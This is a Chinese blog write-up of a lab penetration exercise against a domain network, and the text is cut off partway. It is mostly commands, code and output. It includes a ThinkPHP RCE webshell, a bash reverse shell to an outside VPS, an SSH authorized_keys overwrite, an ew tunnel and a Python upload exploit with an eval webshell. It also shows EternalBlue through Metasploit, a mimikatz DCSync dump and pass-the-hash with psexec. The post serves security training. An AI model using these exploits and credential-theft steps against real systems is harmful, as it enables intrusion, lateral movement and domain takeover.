{"pageProps":{"postData":{"id":"春秋云镜Initial","contentHtml":"<h1>Initial</h1>\n<blockquote>\n<p><a href=\"https://yunjing.ichunqiu.com/major/detail/1077?type=1\">https://yunjing.ichunqiu.com/major/detail/1077?type=1</a></p>\n</blockquote>\n<h2>前期踩点</h2>\n<p>直接使用 <code>fscan</code> 扫描 （靶机IP：<code>39.99.128.239</code>）</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools  ./fscan -h 39.99.128.239\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| <span class=\"hljs-string\">'__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-03-15 00:26:11] [INFO] 暴力破解线程数: 1\n[2025-03-15 00:26:11] [INFO] 开始信息扫描\n[2025-03-15 00:26:11] [INFO] 最终有效主机数量: 1\n[2025-03-15 00:26:11] [INFO] 开始主机扫描\n[2025-03-15 00:26:11] [INFO] 有效端口数量: 233\n[2025-03-15 00:26:11] [SUCCESS] 端口开放 39.99.128.239:110\n[2025-03-15 00:26:11] [SUCCESS] 端口开放 39.99.128.239:21\n[2025-03-15 00:26:11] [SUCCESS] 端口开放 39.99.128.239:22\n[2025-03-15 00:26:11] [SUCCESS] 端口开放 39.99.128.239:80\n[2025-03-15 00:26:11] [SUCCESS] 服务识别 39.99.128.239:21 => \n[2025-03-15 00:26:11] [SUCCESS] 服务识别 39.99.128.239:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-03-15 00:26:13] [SUCCESS] 服务识别 39.99.128.239:110 => \n[2025-03-15 00:26:17] [SUCCESS] 服务识别 39.99.128.239:80 => [http]\n[2025-03-15 00:26:21] [INFO] 存活端口数量: 4\n[2025-03-15 00:26:21] [INFO] 开始漏洞扫描\n[2025-03-15 00:26:21] [INFO] 加载的插件: ftp, pop3, ssh, webpoc, webtitle\n[2025-03-15 00:26:21] [SUCCESS] 网站标题 http://39.99.128.239      状态码:200 长度:5578   标题:Bootstrap Material Admin\n[2025-03-15 00:26:28] [SUCCESS] 目标: http://39.99.128.239:80\n  漏洞类型: poc-yaml-thinkphp5023-method-rce\n  漏洞名称: poc1\n  详细信息:\n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce\n</span></code></pre>\n<h2>Thinkphp 5.0.23 RCE</h2>\n<p>直接扫出来了<code>Thinkphp</code>的<code>rce</code>漏洞，使用工具一把梭哈</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image.png\" alt=\"image.png\"></p>\n<p>直接<code>GETSHELL</code> ，在网站目录下生成一个一句话木马</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image1.png\" alt=\"image.png\"></p>\n<p>我们使用蚁剑连接</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image2.png\" alt=\"image.png\"></p>\n<p>虚拟终端查看权限</p>\n<pre><code class=\"hljs language-bash\">(www-data:/var/www/html) $ <span class=\"hljs-built_in\">whoami</span>\nwww-data\n(www-data:/var/www/html) $ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> www-data on ubuntu-web01:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\nUser www-data may run the following commands on ubuntu-web01:\n    (root) NOPASSWD: /usr/bin/mysql\n(www-data:/var/www/html) $  \n</code></pre>\n<p>可以以<code>root</code>权限执行<code>mysql</code> ，通过<code>gtfobins</code>来寻找利用方法：<a href=\"https://gtfobins.github.io/gtfobins/mysql/\">https://gtfobins.github.io/gtfobins/mysql/</a></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image3.png\" alt=\"image.png\"></p>\n<p>先反弹<code>shell</code> ，将<code>shell</code> 弹到 vps 上</p>\n<pre><code class=\"hljs language-bash\"> bash -c <span class=\"hljs-string\">'exec bash -i &#x26;>/dev/tcp/ip/7777 &#x3C;&#x26;1'</span>\n</code></pre>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image4.png\" alt=\"image.png\"></p>\n<p>提权，但是没有交互式<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">www-data@ubuntu-web01:/var/www/html$ <span class=\"hljs-built_in\">sudo</span> mysql -e <span class=\"hljs-string\">'\\! /bin/sh'</span>\n<span class=\"hljs-built_in\">sudo</span> mysql -e <span class=\"hljs-string\">'\\! /bin/sh'</span>\n\n<span class=\"hljs-built_in\">id</span>\nuid=0(root) gid=0(root) <span class=\"hljs-built_in\">groups</span>=0(root)\n</code></pre>\n<p>通过<code>fscan</code>扫描我们能知道服务器开了<code>SSH</code>服务，在root下能找到<code>.ssh</code>并且存在<code>authorized_keys</code></p>\n<p>我们生成新的<code>SSH</code>密钥对，并将<code>id_rsa.pub</code>覆盖<code>authorized_keys</code></p>\n<pre><code class=\"hljs language-bash\">// kali\n⚡ root@kali  ~  ssh-keygen -t rsa\n</code></pre>\n<pre><code class=\"hljs language-bash\">// 靶机\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxXpjYGlyNDtcmbZOsYeg0b7nB7P0ltBXDjYhUBeqUxtWj7g8c3z2us9m1DZupz2u2pW4TfEFLRUC0L0+itO0eZ5stffv4DZSTElKUFToFDpFcOmvNeLhS7l2L7MM9Vzj0W57+aXumMfeNlTVqM39+yc0tbSBUUA3Kx4hdsHTdjsktWPBdUfLQyGoYGLEB3Lg3jy8WJceLuTP0Ri3Bm/Osr1o28Gd9YRF2unzV6pW8kbOpKz2BcsiknYeGvfkh+PrxmZIr8j6o4TggaVfDYX7mXA+ClA2SgtDgcLs3pwSPeZulEF2JasqkPLJ8blKQMDzwHT2ijg11XXOarTl+B/T7AjmH12kD918jZ61n1ytYvfxBwrYLTFbS9YYKwPk/sCQBEgXqkhZUrTieq0byadADS1c3WnJc20J5UbsUv+au8jnt+WW0myh63R3JH7+kUUrI6Vqlpqqd4kb/IJaroPHjh7Ihck5l7M3+Wtqwh+/2Luo63t0wQZbZH79v9uCifEU= root@kali\"</span> > authorized_keys\n</code></pre>\n<p>使用<code>SSH</code>连接，直接登陆成功</p>\n<pre><code class=\"hljs language-bash\"> ⚡ root@kali  ~  ssh root@39.99.128.239\n\nWelcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-110-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\nNew release <span class=\"hljs-string\">'22.04.5 LTS'</span> available.\nRun <span class=\"hljs-string\">'do-release-upgrade'</span> to upgrade to it.\n\nWelcome to Alibaba Cloud Elastic Compute Service !\n\nNo mail.\nLast login: Sat Mar 15 13:21:12 2025 from xxxxxxxx\nroot@ubuntu-web01:~# \n</code></pre>\n<p>（PS：打到这里沙砾没了，要重新开，这里开始靶机为 <code>39.99.138.102</code>）</p>\n<p>当前目录下能找到<code>flag01.txt</code></p>\n<pre><code class=\"hljs language-perl\">root<span class=\"hljs-variable\">@ubuntu</span>-web01:~/flag<span class=\"hljs-comment\"># cat flag01.txt</span>\n ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████\n░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██\n ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░\n  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██\n   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████\n  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██\n ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████\n░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░\n\nCongratulations!!! You found the first flag, the <span class=\"hljs-keyword\">next</span> flag may be in a server in the internal network.\n\nflag01: flag{60b53231-\n</code></pre>\n<h2>内网信息收集</h2>\n<p>查看网卡信息，得知内网网段是<code>172.22.1.0</code></p>\n<pre><code class=\"hljs language-bash\">root@ubuntu-web01:~/flag# ip add\n1: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/ether 00:16:3e:2d:93:7a brd ff:ff:ff:ff:ff:ff\n    inet 172.22.1.15/16 brd 172.22.255.255 scope global dynamic eth0\n       valid_lft 315359626sec preferred_lft 315359626sec\n    inet6 fe80::216:3eff:fe2d:937a/64 scope <span class=\"hljs-built_in\">link</span> \n       valid_lft forever preferred_lft forever\n</code></pre>\n<p>上传<code>fscan</code> 进行扫描</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools  scp fscan root@39.99.138.102:/root\nfscan                                                            100% 8384KB   2.8MB/s   00:02   \n</code></pre>\n<pre><code class=\"hljs language-bash\">root@ubuntu-web01:~# ./fscan -h 172.22.1.0/24                                                                     \n                                                                                                                                                                                                                                    \n   ___                              _                                                                             \n  / _ \\     ___  ___ _ __ __ _  ___| | __                                                                         \n / /_\\/____/ __|/ __| <span class=\"hljs-string\">'__/ _` |/ __| |/ /                                                                         \n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;                                                                          \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\                                                                         \n                     fscan version: 1.8.4                                                                         \nstart infoscan                                           \n(icmp) Target 172.22.1.15     is alive                                                                            \n(icmp) Target 172.22.1.2      is alive          \n(icmp) Target 172.22.1.21     is alive                                                                            \n(icmp) Target 172.22.1.18     is alive                                                                            \n[*] Icmp alive hosts len is: 4                  \n172.22.1.18:3306 open\n172.22.1.18:445 open \n172.22.1.21:445 open\n172.22.1.2:445 open\n172.22.1.18:139 open\n172.22.1.21:139 open                                                                                                                                                                                                                \n172.22.1.2:139 open                             \n172.22.1.18:135 open\n172.22.1.21:135 open\n172.22.1.2:135 open\n172.22.1.18:80 open\n172.22.1.15:80 open\n172.22.1.15:22 open                                                                                               \n172.22.1.2:88 open                                                                                                                                                                                                                  \n[*] alive ports len is: 14                                                                                                                                                                                                          \nstart vulscan                                                                                                                                                                                                                       \n[*] NetInfo                                                                                                       \n[*]172.22.1.18                                                                                                    \n   [->]XIAORANG-OA01                        \n   [->]172.22.1.18\n[*] NetInfo \n[*]172.22.1.21                                                                                                    \n   [->]XIAORANG-WIN7                                     \n   [->]172.22.1.21                                       \n[*] NetInfo                                                                                                       \n[*]172.22.1.2                                                                                                     \n   [->]DC01                                              \n   [->]172.22.1.2                                                                                                 \n[*] OsInfo 172.22.1.2   (Windows Server 2016 Datacenter 14393)                                                    \n[+] MS17-010 172.22.1.21        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)                           \n[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1                                                                                                               \n[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393             \n[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600            \n[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin                         \n[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login         \n[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统                                \n[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1                                              \n已完成 14/14                                             \n[*] 扫描结束,耗时: 7.72653891s                                                                                    \n</span></code></pre>\n<p>我们获得了的<code>172.22.1.15</code>的<code>shell</code> ，那么<code>172.22.1.2</code> 、<code>172.22.1.18</code> 、<code>172.22.1.21</code> 是内网主机</p>\n<p>并且内网主机<code>172.22.1.21</code> 存在永恒之蓝</p>\n<h2>隧道搭建</h2>\n<p>上传<code>ew</code>搭建隧道</p>\n<p>vps：</p>\n<pre><code class=\"hljs language-bash\">./ew -s rcsocks -l 1080 -e 8889 &#x26;\n</code></pre>\n<p>靶机：</p>\n<pre><code class=\"hljs language-bash\">./ew -s rssocks -d 8.134.163.255 -e 8889 &#x26;\n</code></pre>\n<p><code>kali</code>设置代理，修改<code>proxychain4</code> ，添加<code>vps</code>地址</p>\n<pre><code class=\"hljs language-bash\"> ✘ ⚡ root@kali  ~/Desktop/Tools  <span class=\"hljs-built_in\">tail</span> -n 10 /etc/proxychains4.conf \n<span class=\"hljs-comment\">#</span>\n<span class=\"hljs-comment\">#       proxy types: http, socks4, socks5, raw</span>\n<span class=\"hljs-comment\">#         * raw: The traffic is simply forwarded to the proxy without modification.</span>\n<span class=\"hljs-comment\">#        ( auth types supported: \"basic\"-http  \"user/pass\"-socks )</span>\n<span class=\"hljs-comment\">#</span>\n[ProxyList]\n<span class=\"hljs-comment\"># add proxy here ...</span>\n<span class=\"hljs-comment\"># meanwile</span>\n<span class=\"hljs-comment\"># defaults set to \"tor\"</span>\nsocks5  8.xxx.xxx.xxx   1080\n</code></pre>\n<p>测试是否成功</p>\n<p>能获取到内网地址信息，隧道搭建成功</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/Tools  proxychains4 curl http://172.22.1.18\\?m\\=login -i                                                                                                                                                 \n[proxychains] config file found: /etc/proxychains4.conf  \n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                            \n[proxychains] DLL init: proxychains-ng 4.17                                                                       \n[proxychains] Strict chain  ...  8.xx.x.xxx:1080  ...  172.22.1.18:80  ...  OK                                                                                                                                                   \nHTTP/1.1 200 OK                                                                                                                                                                                                                     \nDate: Sat, 15 Mar 2025 06:03:05 GMT                      \nServer: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9                                                      \nX-Powered-By: PHP/7.1.9                                  \nExpires: Thu, 19 Nov 1981 08:52:00 GMT                                                                            \nCache-Control: no-store, no-cache, must-revalidate       \nPragma: no-cache                                                                                                  \nSet-Cookie: PHPSESSID=6pqaa6aera5uvkab5ip1qv2o96; path=/                                                                                                                                                                            \nTransfer-Encoding: chunked    \nContent-Type: text/html;charset=utf-8         \n                                                                                                                  \n&#x3C;!DOCTYPE html>                                                                                                   \n&#x3C;html lang=<span class=\"hljs-string\">\"zh-CN\"</span>>                                                                                               \n&#x3C;<span class=\"hljs-built_in\">head</span>>                                                                                                                                                                                                                              \n&#x3C;!--&#x3C;meta http-equiv=<span class=\"hljs-string\">\"X-UA-Compatible\"</span> content=<span class=\"hljs-string\">\"IE=edge\"</span>>-->                                                      \n&#x3C;meta http-equiv=<span class=\"hljs-string\">\"Content-Type\"</span> content=<span class=\"hljs-string\">\"text/html; charset=utf-8\"</span> />                                             \n&#x3C;title>信呼协同办公系统&#x3C;/title>                                                                                   \n&#x3C;<span class=\"hljs-built_in\">link</span> rel=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text/css\"</span> href=<span class=\"hljs-string\">\"webmain/css/css.css\"</span>/>    \n&#x3C;div class=<span class=\"hljs-string\">\"blank20\"</span>>&#x3C;/div>\n        &#x3C;div align=<span class=\"hljs-string\">\"center\"</span> style=<span class=\"hljs-string\">\"height:30px;line-height:30px;color:#555555\"</span>>\n                Copyright &#x26;copy;2025 信呼协同办公系统v2.2.8 &#x26;nbsp; - &#x26;nbsp; \n                版权所有：&#x3C;a href=<span class=\"hljs-string\">\"http://www.rockoa.com/\"</span> style=<span class=\"hljs-string\">\"color:#1F83C1\"</span> target=<span class=\"hljs-string\">\"_blank\"</span>>信呼开发团队&#x3C;/a>\n        &#x3C;/div>\n        &#x3C;script <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"text/javascript\"</span> src=<span class=\"hljs-string\">\"mode/plugin/jquery-rockmodels.js\"</span>>&#x3C;/script>                \n</code></pre>\n<p><code>Windows</code>设置代理，使用<code>proxifier</code> 即可</p>\n<h2>信呼协同办公系统 v2.2.8</h2>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image5.png\" alt=\"image.png\"></p>\n<p>弱口令尝试：<code>admin</code> <code>admin123</code> 可以进入系统…</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image6.png\" alt=\"image.png\"></p>\n<p>搜索引擎搜索漏洞，可以知道存在文件上传漏洞：<a href=\"https://www.cnblogs.com/Error1s/p/16869854.html\">https://www.cnblogs.com/Error1s/p/16869854.html</a></p>\n<p>直接使用脚本来打</p>\n<pre><code class=\"hljs language-bash\">import requests\n\nsession = requests.session()\nurl_pre = <span class=\"hljs-string\">'http://172.22.1.18/'</span>\nurl1 = url_pre + <span class=\"hljs-string\">'?a=check&#x26;m=login&#x26;d=&#x26;ajaxbool=true&#x26;rnd=533953'</span>\nurl2 = url_pre + <span class=\"hljs-string\">'/index.php?a=upfile&#x26;m=upload&#x26;d=public&#x26;maxsize=100&#x26;ajaxbool=true&#x26;rnd=798913'</span>\n<span class=\"hljs-comment\"># url3 = url_pre + '/task.php?m=qcloudCos|runt&#x26;a=run&#x26;fileid=&#x3C;ID>'</span>\ndata1 = {\n    <span class=\"hljs-string\">'rempass'</span>: <span class=\"hljs-string\">'0'</span>,\n    <span class=\"hljs-string\">'jmpass'</span>: <span class=\"hljs-string\">'false'</span>,\n    <span class=\"hljs-string\">'device'</span>: <span class=\"hljs-string\">'1625884034525'</span>,\n    <span class=\"hljs-string\">'ltype'</span>: <span class=\"hljs-string\">'0'</span>,\n    <span class=\"hljs-string\">'adminuser'</span>: <span class=\"hljs-string\">'YWRtaW4='</span>,\n    <span class=\"hljs-string\">'adminpass'</span>: <span class=\"hljs-string\">'YWRtaW4xMjM='</span>,\n    <span class=\"hljs-string\">'yanzm'</span>: <span class=\"hljs-string\">''</span>\n}\n\nr = session.post(url1, data=data1)\nr = session.post(url2, files={<span class=\"hljs-string\">'file'</span>: open(<span class=\"hljs-string\">'1.php'</span>, <span class=\"hljs-string\">'r+'</span>)})\nfilepath = str(r.json()[<span class=\"hljs-string\">'filepath'</span>])\nfilepath = <span class=\"hljs-string\">\"/\"</span> + filepath.split(<span class=\"hljs-string\">'.uptemp'</span>)[0] + <span class=\"hljs-string\">'.php'</span>\n<span class=\"hljs-built_in\">print</span>(filepath)\n<span class=\"hljs-built_in\">id</span> = r.json()[<span class=\"hljs-string\">'id'</span>]\nurl3 = url_pre + f<span class=\"hljs-string\">'/task.php?m=qcloudCos|runt&#x26;a=run&#x26;fileid={id}'</span>\nr = session.get(url3)\nr = session.get(url_pre + filepath + <span class=\"hljs-string\">\"?1=system('dir');\"</span>)\n<span class=\"hljs-built_in\">print</span>(r.text)\n</code></pre>\n<p><code>1.php</code>和<code>exp.py</code>放在同一目录下</p>\n<pre><code class=\"hljs language-bash\">// 1.php\n&#x3C;?php phpinfo();<span class=\"hljs-built_in\">eval</span>(<span class=\"hljs-variable\">$_POST</span>[1]);?>\n</code></pre>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image7.png\" alt=\"image.png\"></p>\n<p><code>/upload/2025-03/15_14420947.php</code></p>\n<p>使用蚁剑连接</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image8.png\" alt=\"image.png\"></p>\n<p>打开虚拟终端查看权限</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image9.png\" alt=\"image.png\"></p>\n<p>权限是<code>system</code>那么我们能直接找<code>flag</code></p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image10.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">flag02: 2ce3-4813-87d4-\n</code></pre>\n<p>提示我们要打域控制器</p>\n<p>因为我们看到<code>172.22.1.21</code> 存在永恒之蓝，先将其拿下，因为它也是域内主机，域控应该是<code>172.22.1.2</code></p>\n<h2>永恒之蓝</h2>\n<p>通过MSF梭哈</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  proxychains4 msfconsole                          \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\nMetasploit tip: View a module<span class=\"hljs-string\">'s description using info, or the enhanced \nversion in your browser with info -d\n[proxychains] DLL init: proxychains-ng 4.17le.../\n                                                  \n# cowsay++\n ____________\n&#x3C; metasploit >\n ------------\n       \\   ,__,\n        \\  (oo)____\n           (__)    )\\\n              ||--|| *\n\n       =[ metasploit v6.4.34-dev                          ]\n+ -- --=[ 2461 exploits - 1267 auxiliary - 431 post       ]\n+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\n[*] Starting persistent handler(s)...\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\nmsf6 > \nmsf6 > search ms17-010\nmsf6 > use 0\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 172.22.1.21\nmsf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/bind_tcp_uuid\n</span></code></pre>\n<p>梭！（成功率是真的低）</p>\n<pre><code class=\"hljs language-bash\">msf6 exploit(windows/smb/ms17_010_eternalblue) > run                                                              \n[proxychains] DLL init: proxychains-ng 4.17                                                                       \n[proxychains] DLL init: proxychains-ng 4.17                                                                       \n                                                                                                                  \n[*] 172.22.1.21:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK\n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:135  ...  OK\n[+] 172.22.1.21:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)\n[*] 172.22.1.21:445       - Scanned 1 of 1 hosts (100% complete)\n[+] 172.22.1.21:445 - The target is vulnerable.                                                                   \n[*] 172.22.1.21:445 - Connecting to target <span class=\"hljs-keyword\">for</span> exploitation.                                          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK                    \n[+] 172.22.1.21:445 - Connection established <span class=\"hljs-keyword\">for</span> exploitation.                                        \n[+] 172.22.1.21:445 - Target OS selected valid <span class=\"hljs-keyword\">for</span> OS indicated by SMB reply                          \n[*] 172.22.1.21:445 - CORE raw buffer dump (53 bytes)                                                             \n[*] 172.22.1.21:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2   \n[*] 172.22.1.21:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris   \n[*] 172.22.1.21:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P   \n[*] 172.22.1.21:445 - 0x00000030  61 63 6b 20 31                                   ack 1              \n[+] 172.22.1.21:445 - Target <span class=\"hljs-built_in\">arch</span> selected valid <span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">arch</span> indicated by DCE/RPC reply\n[*] 172.22.1.21:445 - Trying exploit with 12 Groom Allocations.                             \n[*] 172.22.1.21:445 - Sending all but last fragment of exploit packet                       \n[*] 172.22.1.21:445 - Starting non-paged pool grooming                                                            \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[+] 172.22.1.21:445 - Sending SMBv2 buffers                                                                       \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[+] 172.22.1.21:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. \n[*] 172.22.1.21:445 - Sending final SMBv2 buffers.                                                                \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK                                \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK                                \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK                                \n[*] 172.22.1.21:445 - Sending last fragment of exploit packet!                                                    \n[*] 172.22.1.21:445 - Receiving response from exploit packet           \n[+] 172.22.1.21:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!  \n[*] 172.22.1.21:445 - Sending egg to corrupted connection.                        \n[*] 172.22.1.21:445 - Triggering free of corrupted buffer.\n[*] Started <span class=\"hljs-built_in\">bind</span> TCP handler against 172.22.1.21:4444           \n。。。。\n[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                \n[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                \n[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                            \n</code></pre>\n<p>成功查看用户信息</p>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image11.png\" alt=\"image.png\"></p>\n<p>加载<code>mimikatz</code> ，并<code>dump</code>所有用户密码</p>\n<pre><code class=\"hljs language-bash\">kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv\n</code></pre>\n<p><img src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image12.png\" alt=\"image.png\"></p>\n<p>可以拿到<code>administrator</code>的<code>hash</code></p>\n<pre><code class=\"hljs language-bash\">10cf89a850fb1cdbe6bb432b859164c8\n</code></pre>\n<p>使用psexec打进去即可</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  proxychains4 psexec.py xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[proxychains] Strict chain  ...  8.134.163.255:1081  ...  172.22.1.2:445  ...  